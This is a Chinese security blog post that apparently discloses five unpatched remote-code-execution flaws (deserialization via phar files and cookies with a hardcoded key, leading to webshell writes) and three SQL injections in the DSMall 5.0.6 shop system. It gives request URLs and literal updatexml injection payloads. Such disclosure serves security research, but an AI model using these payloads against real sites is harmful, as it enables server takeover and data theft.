> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.anquanke.com](https://www.anquanke.com/post/id/203461) 

[![](https://p2.ssl.qhimg.com/t01fe3fe05fbd1969a9.jpg)](https://p2.ssl.qhimg.com/t01fe3fe05fbd1969a9.jpg)

0x01 前言
-------

​ 最近一段时间专门在研究php 反序列化漏洞的挖掘和利用，这篇文章可以算做是研究成果的一个实践输出，文中所有的漏洞本来是提交到cnvd和补天的，被驳回了几次有点心态爆炸，浪费那些宝贵的时间何必呢？该公司开发的这几款web app 几乎都存在文章中审计到的漏洞，本文以DSmall为例进行分析，所有的漏洞分析文档见文末，如需要poc可以私信。

[![image-20200420102016779](https://p3.ssl.qhimg.com/t01442ab541baabf86f.png)](https://p3.ssl.qhimg.com/t01442ab541baabf86f.png)

0x02 介绍
-------

​ DSMall是长沙德尚网络科技有限公司开发的多用户商城系统，基于thinkphp5.0框架开发，目前最新版本是5.0.6。

【官　　网】[http://www.csdeshang.com/](http://www.csdeshang.com/)

【下载地址】[http://www.csdeshang.com/home/download/index.html](http://www.csdeshang.com/home/download/index.html)

【测试环境】php 5.6.27、mysql5.0.11、apache2.2

【测试版本】DSMALL 5.0.6

[![image-20200420102910072](https://p5.ssl.qhimg.com/t01f10c81b2193da9ad.png)](https://p5.ssl.qhimg.com/t01f10c81b2193da9ad.png)

0x03 漏洞统计
---------

<table><thead><tr><th>漏洞类型</th><th>数量</th><th>级别</th><th>利用条件</th><th>修复与否</th></tr></thead><tbody><tr><td>远程代码执行一</td><td>1</td><td>高</td><td>前台注册账户</td><td>未修复</td></tr><tr><td>远程代码执行二</td><td>1</td><td>高</td><td>无</td><td>未修复</td></tr><tr><td>远程代码执行三</td><td>1</td><td>高</td><td>前台注册账户</td><td>未修复</td></tr><tr><td>远程代码执行四</td><td>1</td><td>高</td><td>无</td><td>未修复</td></tr><tr><td>远程代码执行五</td><td>1</td><td>高</td><td>无</td><td>未修复</td></tr><tr><td>SQL注入漏洞一</td><td>1</td><td>中</td><td>后台管理员权限</td><td>未修复</td></tr><tr><td>SQL注入漏洞二</td><td>1</td><td>中</td><td>后台管理员权限</td><td>未修复</td></tr><tr><td>SQL注入漏洞三</td><td>1</td><td>高</td><td>无</td><td>未修复</td></tr></tbody></table>

0x04 漏洞分析
---------

### 远程代码执行漏洞一：

利用条件：前台注册账户

Home模块 Memberinformation控制器cut方法存在可以利用的反序列化操作，利用thinkphp 反序列化代码执行pop chain 可以写文件getshell。

applicationhomecontrollerMemberinformation.php

[![](https://p3.ssl.qhimg.com/t01c1b764aa9fb3e886.png)](https://p3.ssl.qhimg.com/t01c1b764aa9fb3e886.png)

vendortopthinkthink-imagesrcImage.php

[![](https://p0.ssl.qhimg.com/t01cfb7883516966537.jpg)](https://p0.ssl.qhimg.com/t01cfb7883516966537.jpg)

$newfile = str_replace(str_replace(‘/index.php’, ‘’, BASE_SITE_URL).’/uploads’, BASE_UPLOAD_PATH, input(‘post.newfile’));  
$newfile 来自 $_POST[‘newfile’],然后通过SplFileInfo类对象来判断文件是否存在，当该SplFileInfo类构造参数是一个phar文件的时候就会发生反序化操作，相关知识参考：[https://xz.aliyun.com/t/2958。](https://xz.aliyun.com/t/2958%E3%80%82)

[![](https://p4.ssl.qhimg.com/t0175cc6f0d56ee26d0.png)](https://p4.ssl.qhimg.com/t0175cc6f0d56ee26d0.png)

[![](https://p0.ssl.qhimg.com/t01533fa3aef40607e6.png)](https://p0.ssl.qhimg.com/t01533fa3aef40607e6.png)

**漏洞利用：**

生成phar文件，然后通过前台头像或其他上传文件接口上传到目标服务器上，这里直接利用上传文件接口dsmall506/public/index.php?s=home/Snsalbum/swfupload 上传得到路径  
[http://test.com/dsmall506/public/uploads/home/member/1/1_2020031616094143684.jpg](http://test.com/dsmall506/public/uploads/home/member/1/1_2020031616094143684.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e728d92d9778647b.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t017250aa2a8a7d2ddb.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01a3d9bd70a9405871.png)

需要注意的是：  
Shell 文件会直接生成在php 执行路径下，如果需要生成在web目录下，在poc文件中设置shell文件的绝对路径

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ffa4ae294024603c.jpg)

### 远程代码执行漏洞二：

利用条件：无  
公共modelGoodsbrowse getViewedGoodsList 查看用户浏览过的商品信息，当用户处于登录状态时候直接从缓存中获取商品信息进行反序列化操作，如果尚未登录则从cookie里面获取并解密然后进行反序列化，由于cookie加解密函数的KEY是一个固定的值，写死在代码中，因此反序列化函数unserialize的参数可以被我们控制，利用thinkphp5的代码执行反序列化pop chain 可以往目标服务器写文件getshell.  
applicationcommonmodelGoodsbrowse.php

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0128b5ccb63fab542b.png)

applicationcommon.php

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01bab3ab3163fa310b.jpg)

applicationcommon_global.php

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t017fbad088c3400c2a.jpg)

**漏洞利用：**

生成cookie信息并设置访问浏览历史即可getshell  
[http://test.com/dsmall506/public/home/index/viewed_info](http://test.com/dsmall506/public/home/index/viewed_info)  
生成cookie信息：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01c8b4a49fbdefa461.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d0277a7d580c4727.jpg)

调用栈：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t013fc4e100de76e4ff.jpg)

### 远程代码执行漏洞三：

利用条件：前台注册账户  
公共模块logicBuy.php buyDecrypt 方法中存在可以被用户控制的反序列化操作，利用thinkphp5的代码执行反序列化pop chain 可以往目标服务器写文件getshell.  
applicationcommonlogicBuy.php

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01992ea60d9b726cdc.jpg)

查看对buyDecrypt的函数调用，发现有多处调用且参数都可以被用户控制，这里利用修改地址changeAddr这条利用链。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b78d6690a045e728.jpg)

applicationcommonlogicBuy.php  
public function changeAddr($freight_hash, $city_id, $area_id, $member_id)  
applicationhomecontrollerBuy.php

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01b78739232ac06266.jpg)

调用栈

—->homecontrollerBuy.phpchange_addr()—->commonlogicBuy.phpchangeAddr()—->>commonlogicBuy.phpbuyDecrypt()

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0144fa7f140ea3f4dd.jpg)

漏洞利用：  
通过分析我们知道  
Unserizlize(base64_decode(ds_decrypt(strval($string),sha1(md5($member_id . ‘&’ . MD5_KEY)), 0)))  
$key=sha1(md5($member_id . ‘&’ . MD5_KEY))  
$_POST[freight_hash]=ds_encrypt(strval(base64_encode(serialize($a))),$key);

A) MD5_KEY 是一个常量，从源码中获取  
B) $member_id可以通过文件上传文件接口dsmall506/public/index.php?s=home/Snsalbum/swfupload 获取

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01d1e2ac53771bb33c.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0146985162b523f502.jpg)

Poc:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01d73786bfd442fb74.jpg)

Url:[http://test.com/dsmall506/public/index.php?s=home/Buy/change_addr](http://test.com/dsmall506/public/index.php?s=home/Buy/change_addr)  
Post:city_id=1&area_id=1&freight_hash=se1atRqVpfbQo1INkwRgOXeQIUpFfKnR5lnhQVmjUhnYB9v1NU7JxIxWFRYDA6ihAavR_QiUcQ8

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t011530e8ada76badde.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0154850a235cff4c48.jpg)

### 远程代码执行漏洞四：

利用条件：无  
公共模块modelCart.php getCartList和getCartNum  
方法中存在可以被用户控制的反序列化操作，利用thinkphp5的代码执行反序列化pop chain 可以往目标服务器写文件getshell.  
applicationcommonmodelCart.php  
getCartList 方法反序列化

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0123c78990247d075f.jpg)

getCartNum反序列化

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01aa5ab2f8648a4363.jpg)

这里对getCartNum这个点的利用进行分析一下。通过查找存在多处对getCartNum的函数的调用，跟踪分析controller子类BaseHome中有一条简单方便的call chain，这条调用链的起点来自BaseHome类的初始化函数中，因此该类的所有子孙类的任何方法调用都会触发这条调用链。整个调用过程：  
BaseHome::_initialize->BaseHome::showCartCount->Cart::getCartNum

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0154352f1f0866b745.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t019a293730e59021ec.jpg)

阅读showCartCount函数代码，我们知晓要能够触发反序列化操作，必须满足以下两个条件：  
a) Cookie[‘cart_goods_num’]为空  
b) 用户处于未登录状态

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0130dc3175f9bdcd1c.jpg)

Poc：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0103d0c20dc9a052b3.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b3469394cb991099.jpg)

### 远程代码执行漏洞五：

利用条件：无  
Home模块Cart控制器ajax_load 方法中存在用户可以控制的反序列化操作，利用thinkphp5的代码执行反序列化pop chain 可以往目标服务器写文件getshell.

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t014e2d9e6c353a8c09.jpg)

生成payload:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f02d572e12225011.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t012df6a83e5eef23c2.jpg)

设置cookie:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01f1c725204d187c79.jpg)

Request url:  
[http://test.com/dsmall506/public/index.php?s=home/cart/ajax_load](http://test.com/dsmall506/public/index.php?s=home/cart/ajax_load)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t010dbaa434c6ce6cfe.jpg)

### SQL注入漏洞一：

利用条件：后台管理员账户权限  
公共模块common/Model/Artcle.php editArticle 和delArticle存在SQL注入漏洞，审计代码只有delArticle函数中的漏洞可被利用。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t014182efdca9779b26.jpg)

applicationadmincontrollerArticle.php 删除文章功能的Drop方法调用了delArticle 且参数可控，$_GET[artcile_id]==input(‘param.article_id’)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01522c4d3a8ff94a70.jpg)

Poc:  
[http://test.com//dsmall506/public/index.php/admin/article/drop.html?article_id=42+and%20updatexml(1,concat(0x7e,user()),1)](http://test.com//dsmall506/public/index.php/admin/article/drop.html?article_id=42+and%20updatexml(1,concat(0x7e,user()),1))

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01d5a0e1e0862d3ab1.jpg)

### SQL注入漏洞二：

利用条件：后台管理员权限  
公共模块 Goodsclasstag.php delGoodsclasstagByIds 函数存在SQL注入漏洞。  
applicationcommonmodelGoodsclasstag.php

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f3d8e5e1e30360ab.jpg)

在Admin 控制器tag方法中对delGoodsclasstagByIds函数进行了调用，参数使用thinkphp封装函数input获取，类型是一个数组  
aplicationadmincontrollerGoodsclass.php  
public function tag()

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01de73c9ede971bf49.jpg)

Poc:  
[http://test.com/dsmall506/public/index.php?s=admin/goodsclass/tag](http://test.com/dsmall506/public/index.php?s=admin/goodsclass/tag)  
Data:  
tag_id[0]= 1 and updatexml(1,user(),1)&submit_type=del

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0171c215d5658f9aa5.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01d6908511df2536e2.jpg)

### SQL注入漏洞三：

利用条件：无  
Home模块shopnearby控制器get_Own_Store_List方法存在SQL注入漏洞。  
变量 $lat和$lng使用input 函数来获取，其实就是 $_GET或$_POST的值，这个函数是thinkphp封装的获取请求值函数。获取之后直接拼接传入where(),where()函数是thinkphp封装的函数，官方推荐使用 where(array[])来对用户数据进行处理比较安全，如果直接作为字符串参数传入该函数，那么对参数就需要用户自己进行过滤或转移处理，否则直接带入数据库进行查询，这是thinkphp官方文档的开发说明，而这里并没有按照官方文档说明来做，也没有进行转移或过滤，故造成SQL注入。  
applicationhomecontrollerShopnearby.php

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01b48314419c95676a.jpg)

Poc:  
[http://test.com/dsmall506/public/index.php/home/Shopnearby/get_Own_Store_List?latitude=updatexml(1,concat(0x7e,user()),1)&longitude=1](http://test.com/dsmall506/public/index.php/home/Shopnearby/get_Own_Store_List?latitude=updatexml(1,concat(0x7e,user()),1)&longitude=1)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0119fce56eb42ba9a8.jpg)

0x05 结语
-------

​ 2018 BlackHat Sam Thomas分享了利用phar文件触发反序列化的研究文章，大大扩展了反序列化漏洞的攻击面，在审计cms的时候除了关注unserialize作为source之外，也应该重点关注这些能够利用phar文件反序列利用的函数，而对于php反序列化漏洞挖掘和利用（包括fuzz sink function 和pop chain find）期待下篇文章吧。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t010de40f816f7c0ae8.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0174b09262c57ebece.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t011149435f3216bf12.png)